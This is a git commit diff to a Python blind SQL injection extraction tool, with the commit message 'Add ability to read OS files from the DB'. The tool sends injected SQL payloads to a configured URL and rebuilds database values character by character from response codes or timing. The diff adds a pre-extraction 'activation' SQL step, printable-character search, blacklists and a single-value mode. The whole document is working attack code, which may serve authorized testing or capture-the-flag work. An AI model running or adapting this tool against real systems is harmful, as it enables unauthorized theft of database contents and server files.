503be0687b7eb556a550cbea64aa398c07538e26
Roy <roy.dar.mail@gmail.com>
2022-01-25 16:01:04 +0200

    Add ability to read OS files from the DB

--- extract_data.py
+++ extract_data.py
@@ -9,7 +9,10 @@ import requests
 _logger = logging.getLogger(__name__)
 
 _CONFIG_SEARCH_CHARS = 'search_chars'
-_CONFIG_DEFAULT_SEARCH_CHARS = string.ascii_uppercase + '_' + string.digits
+_CONFIG_DEFAULT_SEARCH_CHARS = string.printable
+
+_CONFIG_BLACKLIST_CHARS = "blacklist_chars"
+_CONFIG_LAST_RESORT_CHARS = "last_resort_chars"
 
 _CONFIG_BASE_URL = "base_url"
 _CONFIG_BASE_PARAMS = "base_params"
@@ -31,6 +34,7 @@ _CONFIG_SQL_PAYLOAD_DEFAULT = \
     '''
 
 _CONFIG_SQL_SEARCH = 'sql_search'
+_CONFIG_SQL_ACTIVATION = 'sql_activation'
 _CONFIG_SQL_EXACT = 'sql_exact'
 
 _CONFIG_EXPECTED_ERROR_CODE = "expected_error_code"
@@ -38,6 +42,12 @@ _CONFIG_DEFAULT_EXPECTED_ERROR_CODE = 200
 
 _CONFIG_TIME_THRESHOLD = "time_threshold"
 _CONFIG_BLACKLIST_PREFIX = "blacklist_prefix"
+
+_CONFIG_SINGLE_VALUE_SEARCH = "single_value"
+_CONFIG_DEFAULT_SINGLE_VALUE_SEARCH = False
+
+_CONFIG_ESCAPE_VALUE = "escape_value"
+_CONFIG_DEFAULT_ESCAPE_VALUE = True
 
 
 def _read_configurations():
@@ -69,7 +79,7 @@ def _call(config, injected_value, time_threshold=0):
     valid_response = response.status_code == expected_error_code
     response.close()
 
-    if time_threshold > 0:
+    if valid_response and time_threshold > 0:
         valid_response = time_took > time_threshold
 
     return valid_response
@@ -83,15 +93,23 @@ def _sanity_call(config):
         raise Exception("Sanity call failed")
 
 
-def _call_with_value(config, search_value, is_exact):
+def _call_with_value(config, search_value, is_exact, is_activation):
     valid_value = config.get(_CONFIG_INJECTED_PARAM_VALID_VALUE, '')
     time_threshold = config.get(_CONFIG_TIME_THRESHOLD, 0)
 
-    search_value = search_value.replace('_', '\\_')
+    escape_value = config.get(_CONFIG_ESCAPE_VALUE, _CONFIG_DEFAULT_ESCAPE_VALUE)
+
+    if escape_value:
+        search_value = search_value.replace('\\', '[\\]')
+        search_value = search_value.replace('_', '\\_')
+        search_value = search_value.replace('%', '\\%')
+
     sql_payload = config.get(_CONFIG_SQL_PAYLOAD, _CONFIG_SQL_PAYLOAD_DEFAULT)
 
     if is_exact:
         inner = config[_CONFIG_SQL_EXACT]
+    elif is_activation:
+        inner = config[_CONFIG_SQL_ACTIVATION]
     else:
         inner = config[_CONFIG_SQL_SEARCH]
 
@@ -103,30 +121,52 @@ def _call_with_value(config, search_value, is_exact):
 
 
 def _extract_data(config):
+    single_value = config.get(_CONFIG_SINGLE_VALUE_SEARCH, _CONFIG_DEFAULT_SINGLE_VALUE_SEARCH)
     detected_values = []
     blacklist_prefix = config.get(_CONFIG_BLACKLIST_PREFIX, None)
 
     search_chars = config.get(_CONFIG_SEARCH_CHARS, _CONFIG_DEFAULT_SEARCH_CHARS)
+    blacklist_chars = config.get(_CONFIG_BLACKLIST_CHARS, None)
+
+    if blacklist_chars is not None:
+        search_chars = ''.join(ch for ch in search_chars if ch not in blacklist_chars)
+
+    last_resort_chars = config.get(_CONFIG_LAST_RESORT_CHARS, None)
+    if last_resort_chars is not None:
+        search_chars = search_chars + last_resort_chars
 
     detected_prefixes = ['']
     logging.info("Starting search...")
     while len(detected_prefixes) > 0:
         prefix = detected_prefixes.pop()
         if blacklist_prefix is not None and not prefix.upper().startswith(blacklist_prefix.upper()):
-            if len(prefix) > 0:
+            if not single_value and len(prefix) > 0:
                 _logger.debug("Trying to see if {} is exact value".format(prefix))
-                if _call_with_value(config, prefix, True):
+                if _call_with_value(config, prefix, True, False):
                     _logger.debug("Detected value {}".format(prefix))
                     print('{}'.format(prefix), end='')
                     detected_values.append(prefix)
 
-            for ch in search_chars:
+            found_next = False
+            chars_len = len(search_chars)
+            curr_ch_index = 0
+            while (not found_next) and curr_ch_index < chars_len:
+                ch = search_chars[curr_ch_index]
+                curr_ch_index = curr_ch_index + 1
+
                 _logger.debug("Checking {}".format(prefix + ch))
-                is_correct = _call_with_value(config, prefix + ch, False)
+                is_correct = _call_with_value(config, prefix + ch, False, False)
                 if is_correct:
-                    _logger.debug("Detected valid prefix {}".format(prefix + ch))
-                    print('.', end='')
                     detected_prefixes.append(prefix + ch)
+
+                    if single_value:
+                        print(ch, end='')
+                        found_next = True
+                    else:
+                        _logger.debug("Detected valid prefix {}".format(prefix + ch))
+                        print('.', end='')
+            if not found_next and single_value:
+                detected_values.append(prefix)
 
     return detected_values
 
@@ -139,7 +179,11 @@ if __name__ == '__main__':
         _config = _read_configurations()
         _logger.info("Configuration: {}".format(_config))
         _sanity_call(_config)
+        if _CONFIG_SQL_ACTIVATION in _config:
+            _logger.info("Running activation SQL")
+            _call_with_value(_config, '', False, True)
         data = _extract_data(_config)
+        print()
         _logger.info("Detected values: {}".format(data))
     except Exception:
         _logger.exception("Error")
